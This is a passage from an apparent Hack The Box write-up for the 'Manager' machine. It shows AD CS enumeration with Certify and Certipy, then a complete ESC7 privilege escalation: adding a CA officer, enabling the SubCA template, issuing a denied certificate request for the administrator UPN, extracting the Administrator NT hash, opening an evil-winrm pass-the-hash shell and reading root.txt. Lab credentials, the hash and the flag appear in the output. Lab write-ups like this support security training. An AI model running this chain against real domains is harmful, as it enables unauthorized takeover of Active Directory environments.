      Allow  ManageCA, ManageCertificates               MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
      Allow  ManageCA, Enroll                           MANAGER\Raven                 S-1-5-21-4078382237-1492182817-2568127209-1116
      Allow  Enroll                                     MANAGER\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119
    Enrollment Agent Restrictions : None

[+] No Vulnerable Certificates Templates found!



Certify completed in 00:00:07.0766695
```

```c
┌──(user㉿kali)-[~]
└─$ certipy find -dc-ip 10.129.109.226 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[*] Got CA configuration for 'manager-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
Certificate Templates                   : [!] Could not find any certificate templates
```

## Privilege Escalation

```c
┌──(user㉿kali)-[~]
└─$ certipy ca -ca 'manager-DC01-CA' -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -add-officer raven
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

```c
┌──(user㉿kali)-[~]
└─$ certipy ca -ca 'manager-DC01-CA' -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -enable-template SubCA
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/manager/files]
└─$ certipy req -ca 'manager-DC01-CA' -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -target 'dc01.manager.htb' -template 'SubCA' -upn 'administrator@manager.htb'
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 18
Would you like to save the private key? (y/N) y
[*] Saved private key to 18.key
[-] Failed to request certificate
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/manager/files]
└─$ certipy ca -ca 'manager-DC01-CA' -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -issue-request 18
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/manager/files]
└─$ certipy req -ca 'manager-DC01-CA' -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -target 'dc01.manager.htb' -retrieve 18
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 18
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '18.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/manager/files]
└─$ sudo /etc/init.d/virtualbox-guest-utils stop
[sudo] password for user: 
Stopping virtualbox-guest-utils (via systemctl): virtualbox-guest-utils.service.
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/manager/files]
└─$ sudo systemctl stop systemd-timesyncd
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/manager/files]
└─$ sudo net time set -S 10.129.109.226
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/manager/files]
└─$ certipy auth -dc-ip 10.129.109.226 -pfx administrator.pfx -username 'Administrator' -domain 'manager.htb'
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

```c
┌──(user㉿kali)-[~]
└─$ evil-winrm -i manager.htb -u Administrator -H 'ae5064c2f62317332c88629e025924ef'                                 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## root.txt

```c
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
dd25b1914238ae184ad9968026f1131b
```
